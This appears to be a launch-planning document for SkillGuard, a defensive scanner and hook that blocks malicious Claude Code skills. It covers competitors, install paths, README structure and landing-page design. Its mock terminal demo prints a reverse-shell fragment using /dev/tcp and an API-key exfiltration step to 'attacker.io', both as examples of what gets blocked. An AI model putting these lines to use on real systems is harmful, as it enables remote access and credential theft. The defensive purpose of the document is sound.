# SkillGuard — Public Release Strategy & Research

> Research and recommendations for releasing SkillGuard as an open-source GitHub repo with a one-page landing site.
> Compiled June 3, 2026 from three dedicated research passes: (1) GitHub repo presentation — 14+ exemplary repos studied live, (2) one-page landing design + hosting — 12 dev-tool pages studied live, (3) distribution mechanics + competitive landscape — official Claude Code docs + 6 competitors verified.
> All claims sourced from live fetches unless marked **[unverified]**. Full references at the end.

---

## 1. What SkillGuard is

SkillGuard is a defense-in-depth security gate for Claude Code skills. Two pieces:

1. **`skillguard.py`** (828 lines) — a CLI scanner that orchestrates up to **4 independent detection engines** per skill:
   - **Local** — 50+ compiled regex patterns across 13 threat categories (reverse shells, data exfiltration, prompt injection, credential/env theft, obfuscation, persistence, container escape, recon…). Zero dependencies, instant, fully offline.
   - **Cisco AI Skill Scanner** — YARA + AST behavioral analysis (optional Python SDK)
   - **SkillAudit** — REST API, 401 patterns + cross-file analysis (optional, network)
   - **Snyk agent-scan** — LLM-powered semantic detection via `uvx` (optional, needs `SNYK_TOKEN`)

   Findings aggregate by severity into a cache at `~/.claude/skillguard-cache/{skill}.json`.

2. **`skillguard_hook.py`** (86 lines) — a `PreToolUse` hook on the `Skill` matcher. Every skill invocation: clean cache → allow with one-line status; **never scanned → exit 2, hard block**; explicitly skipped → allow with persistent reminder.

Canonical source: `scripts/skillguard/` (the `thebeingman/tools/` copies are byte-identical).

### The one-liner

**Primary (GitHub description / tagline):**

> **Scan Claude Code skills for malicious code — before Claude runs them.**

**Subtitle line (keyword-dense, for discovery):**

> *Four detection engines — zero-dep local patterns, Cisco, Snyk, SkillAudit — orchestrated behind a PreToolUse hook that blocks anything unscanned. Prompt injection, credential theft, reverse shells, data exfiltration: caught at the gate.*

**Why this phrasing:** every high-traction direct competitor (skillcop, claude-skill-antivirus) foregrounds the word **"before"** — it's the entire value prop of a PreToolUse hook in one word. The two-line stack pattern (punchy line + keyword line) is what gitleaks ("Find secrets with Gitleaks 🔑") and trivy (comma-list of everything it scans) use respectively; SkillGuard gets both.

**Personality option** (only as a paired flourish, never standalone): *"Antivirus for your agent's skills."*

---

## 2. Positioning: the orchestrator + runtime enforcer

The skill-security namespace is already crowded with **scanners**. None of them **block at runtime**. That's the wedge.

### Competitive landscape (all verified by live fetch except where noted)

| Tool | URL | What it does | Install | SkillGuard's difference |
|---|---|---|---|---|
| **Cisco AI Skill Scanner** | github.com/cisco-ai-defense/skill-scanner | Multi-engine static/behavioral/LLM scan; SARIF, CI, pre-commit | `pip install cisco-ai-skill-scanner` | SkillGuard **wraps it as one engine** + adds runtime blocking. Cisco is scan-only, no hook, no enforcement. |
| **Snyk agent-scan** | github.com/snyk/agent-scan | 15+ risk categories for agents/MCP/skills (ex-Invariant mcp-scan) | `uvx snyk-agent-scan@latest`; needs account/token | SkillGuard **runs it as an optional engine**; Snyk is point-in-time, not a gate. |
| **SkillAudit** | skillaudit.vercel.app | Free web scanner: credential theft, exfil, prompt injection | Web upload | SkillGuard **calls it as an API engine** + works offline + blocks. |
| **claude-skill-antivirus** | github.com/claude-world/claude-skill-antivirus (70★) | 9-engine scanner; README leads with 71,577-skills-scanned data table | GitHub | Scan-only. No runtime hook. Its data-table credibility move is worth copying (see §5). |
| **skillcop** | github.com/cfitzgerald-pd/skillcop (8★) | LLM-based scanner, threat taxonomy, "detects malicious skills before they're loaded" | GitHub | Scan-only, LLM-dependent. SkillGuard's local engine is zero-dep + deterministic. |
| **Skill Safety Auditor** | skill-safety-auditor.vercel.app (by mtthwmllr) | Plain-English advisory on skill risk | Web | Advisory only; no CLI, no blocking. |
| **ai-skill-scanner** | github.com/suchithnarayan/ai-skill-scanner | LLM + static + taint tracking + CI | GitHub | Scan/analysis only, no runtime guard. |
| **Repello SkillCheck** | repello.ai | Closed browser-upload tool, opaque severity scores | Web upload | SkillGuard is open-source, local, **transparent rules** — you see *why* something flagged. |
| **claude-code-security-hooks** | github.com/slavaspitsyn/claude-code-security-hooks (34★) | 7-layer prompt-injection defense hooks | GitHub | Adjacent (guards Bash, not skills). Its visceral README hook ("Your SSH key is gone") is a register reference. |

**The positioning sentence:** *Every other tool is a scanner. SkillGuard is the orchestrator that runs all of them — plus its own zero-dep engine — and the only one that blocks an unvetted skill at the moment Claude tries to use it.*

### The threat hook (cite, don't FUD)

- **ClawHavoc** — Koi Security, **Feb 1, 2026**: 341 malicious skills on **ClawHub** (the OpenClaw marketplace), ~11.9% of the registry; expanded to 824 by Feb 16; Antiy CERT total tally 1,184. Typosquatted skills with fake "Prerequisites" steps installed Atomic macOS Stealer — 60+ crypto wallets, exchange keys, SSH creds, browser passwords, `.env` files harvested. Canonical: koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting
- **Snyk "ToxicSkills"** — prompt injection in **36% of skills tested, 1,467 malicious payloads** found on ClawHub; separately cited as "13.4% of agent skills contain critical security issues" **[verify exact figures on snyk.io before publishing in hero copy]**
- **OWASP Agentic Skills Top 10** — owasp.org/www-project-agentic-skills-top-10/

> ⚠️ **README accuracy fix required:** ClawHavoc hit **ClawHub/OpenClaw**, not Claude Code's ecosystem. Frame it as "what happens to unguarded skill marketplaces — and Claude Code skills share the same trust model," not as an incident on Claude skills directly. The current README's framing should be checked and corrected.

---

## 3. Distribution: how people install it

**The load-bearing finding (docs-confirmed):** a Claude Code plugin can ship a PreToolUse hook in `hooks/hooks.json`, and **enabling the plugin auto-merges the hook** — no `settings.json` surgery. Quote from code.claude.com/docs/en/hooks: *"When a plugin is enabled, its hooks merge with your user and project hooks."* This eliminates the single most fragile step of any hook-based tool.

### Primary: Claude Code plugin (recommended)

```
/plugin marketplace add SkillGuard/skillguard
/plugin install skillguard@skillguard
```

- Audience already has Claude Code → zero new tooling.
- Hook auto-registers on enable.
- Updates via `/plugin marketplace update` + `version` bump in `plugin.json`.
- **Packaging constraints (docs-confirmed):** the plugin directory is *copied* to a cache on install — no `../` references; everything (CLI + hook + data) must live inside the plugin dir, referenced via `${CLAUDE_PLUGIN_ROOT}`. Persistent state (scan cache) belongs in `${CLAUDE_PLUGIN_DATA}` (survives updates).
- Repo needs: `.claude-plugin/plugin.json` (name/description/version), `.claude-plugin/marketplace.json` at repo root (the repo doubles as its own marketplace), `hooks/hooks.json`:

```json
{
  "description": "Scan skills before Claude runs them",
  "hooks": {
    "PreToolUse": [
      { "matcher": "Skill",
        "hooks": [{ "type": "command", "command": "python3 ${CLAUDE_PLUGIN_ROOT}/skillguard_hook.py" }] }
    ]
  }
}
```

### Secondary: PyPI / `uvx skillguard`

For standalone scanning + CI. Matches the niche convention exactly (`uvx snyk-agent-scan`, `pip install cisco-ai-skill-scanner`). Requires `pyproject.toml` with a `[project.scripts]` entry point and optional extras: `pip install skillguard[cisco,snyk]`.

### Tertiary: `curl -fsSL https://skillguard.sh/install | sh`

Fallback for non-plugin setups. The script copies files to `~/.claude/` and patches `~/.claude/settings.json` **via `python3 -c` (not `jq`)** — Python is a guaranteed dependency of a Python tool, and write-to-temp-then-rename keeps it atomic. This path is tertiary precisely because it reintroduces the settings-patching risk the plugin route eliminates. Always link "View install script" next to the command — security-conscious users *will* read it.

---

## 4. GitHub repo strategy

### Examples studied (14 repos, live-fetched June 2026)

| Repo | Stars | Takeaway worth copying |
|---|---|---|
| anthropics/claude-code | 130k | Multi-platform install one-liners labeled "Recommended"/"Deprecated"; demo.gif hero |
| nvbn/thefuck | 97.2k | Hero = GIF of the tool doing its one magic trick. Sell the "aha" instantly |
| tldr-pages/tldr | 62.7k | Opens by naming the reader's pain before the pitch |
| bigskysoftware/htmx | 48.2k | 4-word lowercase tagline ("high power tools for HTML"). Memorable > descriptive |
| pyenv/pyenv | 44.8k | Collapsible `<details>` blocks keep long install sections scannable |
| aquasecurity/trivy | 35.3k | Keyword-dense comma-list tagline for discovery; Apache-2.0 |
| musistudio/claude-code-router | 34.7k | Banner + focused GIF of the one interactive feature |
| gitleaks/gitleaks | 27.5k | **Documents exit codes explicitly** — critical for a hook/CI tool |
| trufflesecurity/trufflehog | 26.6k | Names pipeline stages as verbs — turns a scanner into a methodology |
| ryoppippi/ccusage | 15.5k | `npx`/`bunx` zero-install "Quick Start (Recommended)" — try before install |
| semgrep/semgrep | 15.4k | "Code scanning at ludicrous speed." — one personality beat on a serious tool |
| pyupio/safety | 2k | Standard Python badge row: Downloads / CI / License / PyPI / PyVersions / Coverage |
| claude-world/claude-skill-antivirus | 70 | **Leads with a 71,577-skills-scanned data table** — instant credibility |
| cfitzgerald-pd/skillcop | 8 | Anchors urgency to a **third-party stat** (Snyk 13.4%), not self-asserted danger |
| slavaspitsyn/claude-code-security-hooks | 34 | Opens with a concrete attack narrative ending "Your SSH key is gone" |
| anthropics/claude-code-security-review | 4.9k | Dedicated "Security Considerations" section — audits *its own* attack surface |

### README blueprint (section order, with the source pattern for each)

1. **Title + wordmark + two-line tagline** (universal)
2. **Badge row** — CI, PyPI version, Python versions, license, Socket.dev (safety/ccusage/trivy)
3. **Hero demo GIF** — a malicious skill getting **blocked** at PreToolUse, live (thefuck/trufflehog)
4. **The threat, ~3 sentences + one cited stat** — Snyk figure + one-line attack story, then *stop* (skillcop + slavaspitsyn)
5. **Quick Start, zero-install** — `uvx skillguard scan` before any commitment (ccusage)
6. **Install** — plugin (primary), pipx/pip/uv, source (claude-code/pyenv multi-method)
7. **Use as a Claude Code hook** — the killer feature; copy-paste snippet (gitleaks's Pre-Commit equivalent)
8. **How it works** — mermaid flow: PreToolUse → cache → scan → block/allow (skillcop/trufflehog)
9. **Detection engines** — table: local + Cisco + Snyk + SkillAudit, what each catches
10. **Threat taxonomy** — 13 categories with severity (skillcop)
11. **Output examples** — real blocked-skill output (claude-skill-antivirus)
12. **Exit codes** — explicit table (gitleaks; agents and CI key off exit status)
13. **Configuration** — engine toggles, allowlist/baseline (gitleaks baseline reduces false-positive friction)
14. **Security considerations** — SkillGuard's own attack surface, fail-open vs fail-closed policy (claude-code-security-review)
15. **False positives** — honest note (claude-skill-antivirus's "~3%" honesty is a trust signal)
16. Contributing → SECURITY.md → License → Related projects

### Language register

Two-phase, deliberately:

- **Phase 1 (threat hook, top):** controlled urgency, *concrete and cited*. One short paragraph: third-party stat + a specific one-line attack story. Then stop. Never sustain fear past the hook.
- **Phase 2 (everything else):** calm security-authoritative — "detects," "validates," "blocks" — gitleaks/trivy register. One tasteful personality beat max (semgrep's "ludicrous speed"). For a tool that blocks the user's own actions, over-claiming dies on the first false positive; pair every threat claim with the honest false-positive note.

### Repo structure & files

- **License: AGPL-3.0-only + commercial dual license** *(decision changed 2026-06-05; originally Apache-2.0)* — stays genuinely open source, forces forks/derived products to publish source and retain attribution, and monetizes commercial use via a separate commercial license (Grafana/Qt model) instead of permitting it freely. Trade-off accepted: some enterprises ban AGPL dependencies — those are exactly the commercial-license leads. See `LICENSE`, `LICENSE-COMMERCIAL.md`, `NOTICE`.
- `SECURITY.md` — private disclosure path (GitHub private advisories + contact). Non-negotiable for a security tool.
- `CONTRIBUTING.md` — geared at **detection-rule contributions** (pattern + test fixture); community rules are how gitleaks/semgrep/trufflehog compound.
- `CODE_OF_CONDUCT.md`, `CHANGELOG.md`/tagged releases.
- `.github/workflows/ci.yml` + green CI badge (trust signal).
- `pyproject.toml` (PEP 621) with extras: `skillguard[cisco,snyk,skillaudit]`.
- `tests/` with **fixture malicious skills** — advertised in the README as a trust signal (skillcop, slavaspitsyn) and doubling as documentation of what's caught.
- `examples/` — settings.json snippet, sample blocked-skill transcript.
- `.claude-plugin/` + `hooks/hooks.json` (per §3).
- **Repo name: `skillguard`** — no collision found in the niche (neighbors: skillcop, claude-skill-antivirus, parry-guard, agentic-coder-shield). Match PyPI package name to repo name.

### Social proof / launch levers

1. **The corpus table** — run SkillGuard over a large public skill corpus, publish the breakdown table at the top of the README (claude-skill-antivirus's 71,577-skills move, but with four engines). *Highest-leverage launch asset.*
2. Submit to **hesreallyhim/awesome-claude-code** (security category) and **efij/awesome-claude-code-security** **[latter unverified — found via search]**.
3. Socket.dev badge immediately (free); Star History chart once there's traction.
4. **Launch artifact:** a short writeup/video of a real exfiltration skill being blocked live — this niche's existing virality pattern (Snyk research posts, slavaspitsyn's narrative posts).

---

## 5. Landing page strategy

### Examples studied (live-fetched June 2026)

| Site | Hero copy (quoted) | Install pattern | Takeaway |
|---|---|---|---|
| starship.rs | "The minimal, blazing-fast, and infinitely customizable prompt for any shell!" | single curl, no copy button | Three adjectives do the whole positioning job |
| bun.sh | "Bun is a fast JavaScript all-in-one toolkit" | OS tabs + copy buttons + "View install script" | Install in the hero, immediately backed by social-proof logos |
| htmx.org | "high power tools for HTML" | working code snippet instead of install | For some tools the example *is* the proof |
| ohmyz.sh | "Unleash your terminal like never before." | curl + wget stacked | Emotion-led headline; community framing as brand |
| ollama.com | "The easiest way to build with open models" | **one universal command** | Pairs command with a simulated terminal *success state* |
| warp.dev | "Ship better software with any agent" | download buttons; OS tabs lower | Dark terminal aesthetic, restrained gradients |
| mise.jdx.dev | "Your dev env, already prepped." | **one command + copy button, repeated at footer** | Convert action always one scroll away |
| docs.astral.sh/uv | "An extremely fast Python package and project manager, written in Rust." | OS-tabbed curl | Naming the impl detail is itself a trust signal |
| semgrep.dev | "Code Security for Builders" | demo/signup CTAs | Frame as *builder enabler, not blocker* |
| 1password.dev/cli | (docs) | 3-level tabs, each path ends with `op --version` | **Always pair install with a verify command** |
| ccusage.com | "Coding (Agent) CLI Usage Analysis" | run command buried | The anti-pattern: closest CC-ecosystem peer hides its command |

(socket.dev and gitleaks.io returned HTTP 403 — excluded rather than reported from memory.)

### Page blueprint (one page, top to bottom)

```
┌──────────────────────────────────────────────────────────────┐
│ [shield] SkillGuard            Docs   GitHub ★   (thin nav)   │
├──────────────────────────────────────────────────────────────┤
│   Nobody checks what's inside the skills                      │  HERO
│   Claude Code runs. SkillGuard does.                          │
│                                                               │
│   Open-source scanner that catches prompt injection,          │
│   credential theft & reverse shells in community skills       │
│   — before Claude ever executes them. Local-only.             │
│                                                               │
│   ┌─────────────────────────────────────────────┐ [copy]     │  THE install moment
│   │ /plugin marketplace add SkillGuard/skillguard│            │
│   │ /plugin install skillguard@skillguard        │            │
│   └─────────────────────────────────────────────┘            │
│   Verify: skillguard --version    [View source] [★ GitHub]   │
├──────────────────────────────────────────────────────────────┤
│   ▶ VHS TERMINAL DEMO (autoloop, ~12s)                        │  the block, live
│     $ /skill install pretty-formatter                         │
│     SkillGuard ⠿ scanning ...                                 │
│     ✗ BLOCKED  reverse shell: bash -i >& /dev/tcp/45.x.x.x   │
│     ✗ BLOCKED  reads ANTHROPIC_API_KEY → POST attacker.io    │
│     PreToolUse hook refused execution. 0 commands ran.       │
├──────────────────────────────────────────────────────────────┤
│   HOW IT WORKS — 3 pillars (starship pattern)                 │
│   Scans every file │ Blocks via PreToolUse │ Rules you can    │
│   in every skill   │ hook — unscanned      │ read. No cloud   │
│   with 4 engines   │ never executes        │ upload, no       │
│                    │                       │ opaque scores    │
├──────────────────────────────────────────────────────────────┤
│   WHAT IT CATCHES — checklist of the threat taxonomy          │
├──────────────────────────────────────────────────────────────┤
│   PROOF BAR — corpus-scan stat + star count [verify stat]     │
├──────────────────────────────────────────────────────────────┤
│   SECOND INSTALL CTA (identical command — mise pattern)       │
├──────────────────────────────────────────────────────────────┤
│   FOOTER  Docs · GitHub · Ruleset · License                   │
└──────────────────────────────────────────────────────────────┘
```

### Hero copy (recommended: option A)

**A — Threat-first** (models Repello's most-quoted line + semgrep's builder framing):
> **Nobody checks what's inside the skills Claude Code runs. SkillGuard does.**
> Open-source scanner that catches prompt injection, credential theft, and reverse shells in community skills — before Claude ever executes them. Local-only. No cloud upload.

**B — Adjective-stack** (starship/uv): *"The fast, open-source security gate for Claude Code skills."*

**C — Benefit-led** (ohmyz.sh/ollama): *"Install community skills without holding your breath."*

### Install CTA spec

- **One command block in the hero with a copy button** — the brightest interactive element on the page. Plugin command primary; "More install methods" secondary link (uvx, curl) per mise.
- **Verify line directly beneath** (1Password pattern): `skillguard --version`.
- **"View install script" link** — mandatory for a security tool asking for trust.
- **Repeat the identical command near the footer** (mise).
- No OS tabs in the hero — CC audience is macOS/Linux; tabs go under "more methods."

### Demo spec

- **Show the block, not a feature tour.** ~10–15s autolooping terminal: malicious skill install → red `✗ BLOCKED` lines naming specific threats → "0 commands ran."
- **Generate with VHS (charmbracelet)** — declarative `.tape` script, version-controlled in the repo, outputs themed GIF/MP4/WebM. Preferred over asciinema (needs no player, polished) — termynal as a selectable-text progressive-enhancement fallback.
- Ship MP4/WebM + GIF fallback; muted autoplay; static frame under `prefers-reduced-motion`.
- Optional second clip: a clean `✓ PASS` *with reasons shown* — reinforces "transparent rules, not opaque scores" against Repello.

### Visual direction

- **Dark-first**: near-black `#0B0E14`–`#0D1117` (GitHub-dark adjacent).
- **Accent = calm guard-green** `#3DDC97`, not alarm-red. **Reserve red strictly for `✗ BLOCKED`** so it carries weight. Amber `#FFB454` for warns.
- Type: **Space Grotesk** (or Inter/Geist) for UI; **JetBrains Mono** (or Berkeley/Geist Mono) for every command and the demo — the monospace *is* the trust signal.
- One restrained gradient glow behind the hero command box max. No mascot, no clip-art padlocks. Single shield line-mark.

### Hosting: **Cloudflare Pages**

| | GitHub Pages | Vercel Hobby | **Cloudflare Pages** |
|---|---|---|---|
| Cost | Free | Free (non-commercial only) | **Free** |
| Bandwidth | ~100GB soft cap | Capped; viral spike → overage | **Unlimited, no overage** |
| Analytics | none built-in | limited free tier | **Free, cookieless, no JS perf hit** |
| Custom domain + TLS | free | free | free |

A static one-pager whose heaviest asset is a demo video that could spike on HN → Cloudflare's unlimited free bandwidth + free analytics wins. No commercial-use ambiguity (Vercel Hobby is non-commercial). Pairs with a Worker later for hosting `skillguard.sh/install` at the edge. GitHub Pages is the zero-new-accounts fallback.

**Domain: `skillguard.sh`** (availability unchecked) — the `.sh` TLD is the single biggest cheap credibility signal for a CLI tool (ohmyz.sh, bun.sh) and makes the install line self-documenting. Fallbacks: `skillguard.dev`, `getskillguard.com`, `skguard.sh`.

---

## 6. Pre-release engineering checklist

From the codebase audit — what must change before the repo goes public:

**Blocking (correctness/trust):**
- [ ] **Fail-open cache bug:** corrupted cache currently falls back to *allow* silently (hook line ~53). A security gate should fail closed — or at minimum warn loudly. Decide and document the policy in §14 of the README.
- [ ] Fix hardcoded `python tools/skillguard.py` path references in hook messages (lines ~44, 67) → use `${CLAUDE_PLUGIN_ROOT}` / installed entry point.
- [ ] README accuracy: ClawHavoc was ClawHub/OpenClaw, not Claude skills (§2).
- [ ] Add `__version__` + version in `plugin.json`.

**Packaging:**
- [ ] `pyproject.toml` (PEP 621), `[project.scripts] skillguard = ...`, extras `[cisco,snyk,skillaudit]`, PyPI publish.
- [ ] `.claude-plugin/plugin.json` + `marketplace.json` + `hooks/hooks.json`; move cache to `${CLAUDE_PLUGIN_DATA}` when running as a plugin.
- [ ] `install.sh` (tertiary path) with python3-based settings patch, atomic write.

**Quality:**
- [ ] Test suite with malicious-skill fixtures (advertised as a trust signal).
- [ ] Allowlist/baseline mechanism (gitleaks pattern) — currently `--skip` is the only escape hatch.
- [ ] Document exit codes explicitly.
- [ ] Cache-write lock (race if two scans hit the same skill).
- [ ] Document `uv` as a prerequisite for the Snyk engine; make SkillAudit endpoint + rate limit configurable.

**Repo hygiene:** LICENSE (AGPL-3.0-only + commercial dual), SECURITY.md, CONTRIBUTING.md (rule contributions), CODE_OF_CONDUCT.md, CI workflow + badge, CHANGELOG/tagged releases, demo `.tape` file in repo.

---

## 7. Launch sequence

1. **Engineering pass** (§6 blocking + packaging items).
2. **Corpus run** — scan a large public skill set, capture the breakdown table (the credibility asset).
3. **VHS demo** — record the block; reuse the same GIF in README hero and landing page.
4. **Repo public** — README per blueprint, plugin-installable from day one.
5. **Landing page** — Cloudflare Pages + `skillguard.sh`, hero copy A.
6. **Distribution posts** — submit to awesome-claude-code (security) + awesome-claude-code-security; write the launch post around the corpus findings + a live block ("we scanned N public skills with 4 engines; here's what we found — and here's the hook that would have stopped it").
7. **PyPI publish** → `uvx skillguard` works for the CI crowd.

---

## 8. Full references

### Official Claude Code docs (fetched)
- https://code.claude.com/docs/en/plugin-marketplaces
- https://code.claude.com/docs/en/hooks
- https://github.com/anthropics/claude-plugins-official
- https://github.com/anthropics/claude-code/blob/main/plugins/plugin-dev/skills/hook-development/SKILL.md
- https://code.claude.com/docs/en/plugins **[referenced, not separately fetched]**

### GitHub presentation examples (fetched)
- https://github.com/anthropics/claude-code
- https://github.com/nvbn/thefuck
- https://github.com/tldr-pages/tldr
- https://github.com/bigskysoftware/htmx
- https://github.com/pyenv/pyenv
- https://github.com/aquasecurity/trivy
- https://github.com/musistudio/claude-code-router
- https://github.com/gitleaks/gitleaks
- https://github.com/trufflesecurity/trufflehog
- https://github.com/ryoppippi/ccusage
- https://github.com/semgrep/semgrep
- https://github.com/pyupio/safety
- https://github.com/getsentry/sentry
- https://github.com/anthropics/claude-code-security-review
- https://github.com/hesreallyhim/awesome-claude-code
- https://github.com/efij/awesome-claude-code-security **[unverified — search snippet only]**
- https://github.com/lasso-security/claude-hooks, https://github.com/vaporif/parry-guard, https://github.com/MG-Cafe/agentic-coder-shield, https://github.com/Eyadkelleh/awesome-claude-skills-security **[unverified — namespace neighbors from search]**

### Competitors (fetched)
- https://github.com/cisco-ai-defense/skill-scanner · https://pypi.org/project/cisco-ai-skill-scanner/
- https://github.com/snyk/agent-scan · https://pypi.org/project/snyk-agent-scan/ · https://labs.snyk.io/experiments/skill-scan/
- https://skillaudit.vercel.app/ (authorship **[unverified]**)
- https://skill-safety-auditor.vercel.app/
- https://github.com/suchithnarayan/ai-skill-scanner
- https://github.com/claude-world/claude-skill-antivirus
- https://github.com/cfitzgerald-pd/skillcop
- https://github.com/slavaspitsyn/claude-code-security-hooks
- https://repello.ai/blog/claude-code-skill-security
- https://repello.ai/blog/cisco-skill-scanner-alternatives

### ClawHavoc / threat research (fetched)
- https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting (canonical disclosure, Feb 1 2026)
- https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html
- https://www.antiy.net/p/clawhavoc-analysis-of-large-scale-poisoning-campaign-targeting-the-openclaw-skill-market-for-ai-agents/
- https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
- https://snyk.io/blog/snyk-vercel-securing-agent-skill-ecosystem/
- https://snyk.io/articles/top-claude-skills-cybersecurity-hacking-vulnerability-scanning/ **[stat figures: verify before hero use]**
- https://owasp.org/www-project-agentic-skills-top-10/

### Landing pages (fetched)
- https://starship.rs · https://bun.sh · https://htmx.org · https://ohmyz.sh · https://ollama.com · https://warp.dev · https://mise.jdx.dev · https://docs.astral.sh/uv/ · https://semgrep.dev · https://www.1password.dev/cli/get-started/ · https://ccusage.com/
- https://github.com/charmbracelet/vhs (demo tooling)
- socket.dev, gitleaks.io — **HTTP 403, not analyzed**

### Notes on verification
Star counts and page layouts are point-in-time (June 2026). Everything marked **[unverified]** came from search snippets, not direct fetches. The Snyk "36% / 1,467 payloads" and "13.4%" figures appear in secondary writeups — confirm against the primary Snyk post before they go in published copy.
